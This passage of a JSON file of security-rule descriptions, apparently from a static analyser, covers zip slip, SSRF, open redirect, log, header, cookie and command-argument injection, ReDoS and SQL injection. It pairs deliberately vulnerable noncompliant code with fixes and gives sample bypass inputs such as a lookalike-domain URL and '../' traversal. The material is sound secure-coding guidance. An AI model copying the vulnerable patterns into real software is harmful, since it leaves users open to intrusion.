remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.commit.malicious.io</code>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\">Top 10 2021 Category A10 - Server-Side Request\n  Forgery (SSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/918\">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "jssecurity:S6096": {
        "name": "Extracting archives should not lead to zip slip vulnerabilities",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access\nthis file without validating its path first.</p>\n<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial\nintended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>\n<h3>What is the potential impact?</h3>\n<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nroot privileges on Linux, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Override arbitrary files</h4>\n<p>The application opens the archive to copy its entries to the file system. The entries' names contain path traversal payloads for existing files in\nthe system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or\noperating system to work properly.</p>\n<p>It could result in data being lost or the application being unavailable.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file\nwithout being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst AdmZip = require(\"adm-zip\");\nconst upload = require('multer');\n\napp.get('/example', upload.single('file'), (req, res) =&gt; {\n    const zip = new AdmZip(req.file.buffer);\n    const zipEntries = zip.getEntries();\n\n    zipEntries.forEach(function (zipEntry) {\n        var writer = fs.createWriteStream(zipEntry.entryName); // Noncompliant\n        writer.write(zipEntry.getData().toString(\"utf8\"));\n    });\n});\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst AdmZip = require(\"adm-zip\");\nconst upload = require('multer');\n\nconst unzipTargetDir = \"/example/directory/\";\n\napp.get('/example', upload.single('file'), (req, res) =&gt; {\n    const zip = new AdmZip(req.file.buffer);\n    const zipEntries = zip.getEntries();\n\n    zipEntries.forEach(function (zipEntry) {\n        const canonicalPath = path.normalize(unzipTargetDir + zipEntry.entryName);\n        if (canonicalPath.startsWith(unzipTargetDir)) {\n            let writer = fs.createWriteStream(canonicalPath);\n            writer.write(zipEntry.getData().toString(\"utf8\"));\n        }\n    });\n});\n</pre>\n<h3>How does this work?</h3>\n<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>\n<p>The validation should be done as follow:</p>\n<ol>\n  <li> Resolve the canonical path of the file by using methods like <code>path.join</code> or <code>path.normalize</code>. This will resolve relative\n  path or path components like <code>../</code> and removes any ambiguity regarding the file’s location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>\n  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>Partial Path Traversal</h4>\n<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path\nseparator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a\npath separator as the last character of the validation strings.</p>\n<p>For example, the following code is vulnerable to partial path injection. Note that the string variable <code>targetDirectory</code> does not end\nwith a path separator:</p>\n<pre>\nconst AdmZip = require(\"adm-zip\");\n\nconst targetDirectory = \"/Users/John\";\n\napp.get('/example', (req, res) =&gt; {\n    const canonicalPath = path.normalize(targetDirectory + req.query.filename)\n\n    if (canonicalPath.startsWith(targetDirectory)) {\n        const zip = new AdmZip(canonicalPath);\n\t    const zipEntries = zip.getEntries();\n\n    \tzipEntries.forEach(function (zipEntry) {\n            var writer = fs.createWriteStream(zipEntry.entryName);\n            writer.write(zipEntry.getData().toString(\"utf8\"));\n\t    });\n    }\n});\n</pre>\n<p>This check can be bypassed because <code>\"/Users/Johnny\".startsWith(\"/Users/John\")</code> returns <code>true</code>. Thus, for validation,\n<code>\"/Users/John\"</code> should actually be <code>\"/Users/John/\"</code>.</p>\n<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br> The validation code should be tested to\nensure that it cannot be impacted by this issue.</p>\n<p><a href=\"https://github.com/advisories/GHSA-xwg4-93c6-3h42\">Here is a real-life example of this vulnerability.</a></p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://snyk.io/research/zip-slip-vulnerability\">snyk</a> - Zip Slip Vulnerability </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "jssecurity:S6287": {
        "name": "Applications should not create session cookies from untrusted input",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>\n<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the\napplication.</p>\n<p>The injection might occur via a GET parameter, and the payload, for example, <code><a\nhref=\"https://example.com?cookie=injectedcookie\">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a\nsession that isn’t theirs.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Sensitive data disclosure</h4>\n<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of\nimplications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>\n<h4>Vulnerability chaining</h4>\n<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and\nexploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,\nwhich can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>\n<h2>How to fix it in Express.js</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport express from \"express\";\nimport cookieParser from \"cookie-parser\";\n\nconst app = express();\napp.use(cookieParser());\n\napp.get(\"/checkcookie\", (req, res) =&gt; {\n    if (req.cookies[\"connect.sid\"] === undefined) {\n        const cookie = req.query.cookie;\n        res.cookie(\"connect.sid\", cookie); // Noncompliant\n    }\n\n    return res.redirect(\"/welcome\");\n});\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport express from \"express\";\nimport cookieParser from \"cookie-parser\";\n\nconst app = express();\napp.use(cookieParser());\n\napp.get(\"/checkcookie\", (req, res) =&gt; {\n    if (req.cookies[\"connect.sid\"] === undefined) {\n        return res.redirect(\"/getcookie\");\n    }\n\n    return res.redirect(\"/welcome\");\n});\n</pre>\n<h3>How does this work?</h3>\n<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the\nvalue of a session cookie to untrusted data.</p>\n<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade\ntools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to\nuse these solutions than to develop your own.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/384\">CWE-384 - Session Fixation</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "jssecurity:S6350": {
        "name": "Constructing arguments of system commands from user input is security-sensitive",
        "htmlDesc": "<p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9920\">CVE-2016-9920</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472\">CVE-2021-29472</a> </li>\n</ul>\n<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the\nprograms. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing\nfiles into specific directories.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Malicious arguments can result in undesired behavior in the executed command. </li>\n  <li> Passing user input to a system command is not necessary. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid constructing system commands from user input when possible. </li>\n  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>\n  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in\nvulnerabilities:</p>\n<pre>\nconst { spawn } = require(\"child_process\");\nconst input = req.query.input;\nconst proc = spawn(\"/usr/bin/find\", [input]); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Use an allow-list to restrict the arguments to trusted values:</p>\n<pre>\nconst { spawn } = require(\"child_process\");\nconst input = req.query.input;\nif (allowed.includes(input)) {\n  const proc = spawn(\"/usr/bin/find\", [input]);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/php-supply-chain-attack-on-composer\">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>\n</ul>",
        "severity": "MAJOR"
      },
      "pythonsecurity:S2631": {
        "name": "Regular expressions should not be vulnerable to Denial of Service attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>\n<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this\ncan lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the\nvulnerable field to make the affected component inaccessible.</p>\n<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Self Denial of Service</h4>\n<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)\ncan trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>\n<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>\n<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the\ndenial of service might only affect the attacker who initiated it.</p>\n<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems\nwould detect the failure of a container and automatically replace it.</p>\n<h4>Infrastructure SPOFs</h4>\n<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture\nvulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient\ncontainer creation capabilities or failures from containers to terminate).</p>\n<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge\noffensive infrastructures.</p>\n<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h2>How to fix it in Python Standard Library</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to Regex Denial of Service (ReDoS) because untrusted data is used as a regex to scan a string without\nprior sanitization or validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom flask import request\nimport re\n\n@app.route('/lookup')\ndef lookup():\n  regex = request.args['regex']\n  data = request.args['data']\n\n  re.search(regex, data) # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom flask import request\nimport re\n\n@app.route('/lookup')\ndef lookup():\n  regex = request.args['regex']\n  data = request.args['data']\n\n  re.search(re.escape(regex), data)\n</pre>\n<h3>How does this work?</h3>\n<h4>Sanitization and Validation</h4>\n<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular\nexpression engine interprets these characters literally.</p>\n<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>\nIf a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>\n<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>\n<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href=\"https://github.com/google/re2\">re2</a>.</p>\n<p>In the compliant solution, <code>re.escape</code> escapes metacharacters and escape sequences that could have broken the initially intended\nlogic.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\">OWASP Regular expression Denial of Service - ReDoS</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "pythonsecurity:S5145": {
        "name": "Logging should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>\n<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br> This\nfrequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log\nentries. <br> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,\nLog4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br></p>\n<p>The focus of this rule is newline character replacement.</p>\n<h4>Log Forge</h4>\n<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious\nactivities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to\nfake application events.</p>\n<h2>How to fix it in Flask</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate\nthe chain of events being recorded.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport logging\n\napp = Flask(__name__)\n\n@app.route('/example')\ndef log():\n    data = request.args[\"data\"]\n    app.logger.critical(\"%s\", data) # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport logging\nimport base64\n\napp = Flask(__name__)\n\n@app.route('/example')\ndef log():\n    data = request.args[\"data\"]\n    if data.isalnum():\n        app.logger.critical(\"%s\", data)\n    else:\n        app.logger.critical(\"Invalid Input: %s\", base64.b64encode(data.encode('UTF-8')))\n</pre>\n<h3>How does this work?</h3>\n<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br> Validation and\nsanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on\nthe application context and the logged data usage.</p>\n<p>Here, the example compliant code uses the <code>isalnum</code> function to ensure the untrusted data is safe. If not, it performs Base64 encoding\nto protect from log injection.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">Top 10 2017 Category A10 -\n  Insufficient Logging &amp; Monitoring</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/117\">CWE-117 - Improper Output Neutralization for Logs</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "pythonsecurity:S5146": {
        "name": "HTTP request redirections should not be open to forging attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>\n<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as\n<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>\n<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker\nto build a credible pretext to prevent suspicions from the victim.<br></p>\n<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>\n<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Domain Mirroring</h4>\n<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the\nsimilarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a\nmalicious domain.<br></p>\n<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any\nauthenticated data or action.</p>\n<h4>Malware Distribution</h4>\n<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the\nattacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a\nhosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>\n<h2>How to fix it in Flask</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used\nto redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nfrom flask import Flask, redirect\n\napp = Flask(\"example\")\n\n@app.route(\"/redirecting\")\ndef redirecting():\n    url = request.args[\"url\"]\n    return redirect(url) # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nfrom flask import Flask, redirect, url_for\n\napp = Flask(\"example\")\n\n@app.route(\"/redirecting\")\ndef redirecting():\n    url = request.args[\"url\"]\n    return redirect(url_for(url))\n</pre>\n<h3>How does this work?</h3>\n<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in\nmethods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>\n<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following\nalternatives:</p>\n<ol>\n  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>\n  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>\n  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>The trap of 'StartsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like\nexisting domains is widespread and is called <a href=\"https://en.wikipedia.org/wiki/Cybersquatting\">Cybersquatting</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/601\">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "pythonsecurity:S5167": {
        "name": "HTTP response headers should not be vulnerable to injection attacks",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=python%3AS5122'>S5122</a>, <a href='/coding_rules#rule_key=python%3AS5146'>S5146</a>, <a href='/coding_rules#rule_key=python%3AS6287'>S6287</a>, <a href='/coding_rules#rule_key=python%3AS6839'>S6839</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>User-provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications\nconstructing HTTP response headers based on tainted data could allow attackers to change security sensitive headers like Cross-Origin Resource Sharing\nheaders.</p>\n<p>Web application frameworks and servers might also allow attackers to inject new line characters in headers to craft malformed HTTP response. In\nthis case the application would be vulnerable to a larger range of attacks like HTTP Response Splitting/Smuggling. Most of the time this type of\nattack is mitigated by default modern web application frameworks but there might be rare cases where older versions are still vulnerable.</p>\n<p>As a best practice, applications that use user-provided data to construct the response header should always validate the data first. Validation\nshould be based on a whitelist.</p>\n<h3>Noncompliant code example</h3>\n<p>Flask</p>\n<pre>\nfrom flask import Response, request\nfrom werkzeug.datastructures import Headers\n\n@app.route('/route')\ndef route():\n    content_type = request.args[\"Content-Type\"]\n    response = Response()\n    headers = Headers()\n    headers.add(\"Content-Type\", content_type) # Noncompliant\n    response.headers = headers\n    return response\n</pre>\n<p>Django</p>\n<pre>\nimport django.http\n\ndef route(request):\n    content_type = request.GET.get(\"Content-Type\")\n    response = django.http.HttpResponse()\n    response.__setitem__('Content-Type', content_type) # Noncompliant\n    return response\n</pre>\n<h3>Compliant solution</h3>\n<p>Flask</p>\n<pre>\nfrom flask import Response, request\nfrom werkzeug.datastructures import Headers\nimport re\n\n@app.route('/route')\ndef route():\n    content_type = request.args[\"Content-Type\"]\n    allowed_content_types = r'application/(pdf|json|xml)'\n    response = Response()\n    headers = Headers()\n    if re.match(allowed_content_types, content_type):\n        headers.add(\"Content-Type\", content_type)  # Compliant\n    else:\n        headers.add(\"Content-Type\", \"application/json\")\n    response.headers = headers\n    return response\n</pre>\n<p>Django</p>\n<pre>\nimport django.http\nimport re\n\ndef route(request):\n    content_type = request.GET.get(\"Content-Type\")\n    allowed_content_types = r'application/(pdf|json|xml)'\n    response = django.http.HttpResponse()\n    if re.match(allowed_content_types, content_type):\n        response.__setitem__('Content-Type', content_type) # Compliant\n    else:\n        response.__setitem__('Content-Type', \"application/json\")\n    return response\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/index.php/HTTP_Response_Splitting\">Attack Category - HTTP Response Splitting</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/113\">CWE-113 - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response\n  Splitting')</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "pythonsecurity:S6776": {
        "name": "Stack-traces should not be disclosed",
        "htmlDesc": "<p>Exception stack traces contain sensitive data that the application’s code should not disclose as error messages.</p>\n<h2>Why is this an issue?</h2>\n<p>Stack traces contain sensitive data like filenames or folder hierarchies. They can expose implementation details, including the application’s\narchitecture, logic, and potential vulnerabilities. Attackers can leverage these valuable insights to identify weaknesses, devise attack strategies,\nand exploit vulnerabilities.</p>\n<h2>How to fix it in Flask</h2>\n<p>Implement proper error handling by reporting customized error messages that do not contain a detailed stack trace. Log the exception stack trace if\nneeded.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@app.errorhandler(500)\ndef internal_server_error(error):\n    error_message = traceback.format_stack()\n    return render_template('error.html', error_message=error_message), 500\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@app.errorhandler(500)\ndef internal_server_error(error):\n    error_message = \"Internal Server Error\"\n    logging.exception()\n    return render_template('error.html', error_message=error_message), 500\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<p>Python Documentation - <a href=\"https://docs.python.org/3/library/traceback.html\">traceback — Print or retrieve a stack traceback</a></p>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/209\">CWE-209 - Generation of Error Message Containing Sensitive Information</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "pythonsecurity:S3649": {
        "name": "Database queries should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and\ninserts it into a database query without sanitizing it first.</p>\n<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is\nused.</p>\n<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>\n<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any\npre-requisites.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the\nvulnerable field to execute malicious commands in the affected databases.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Identity spoofing and data 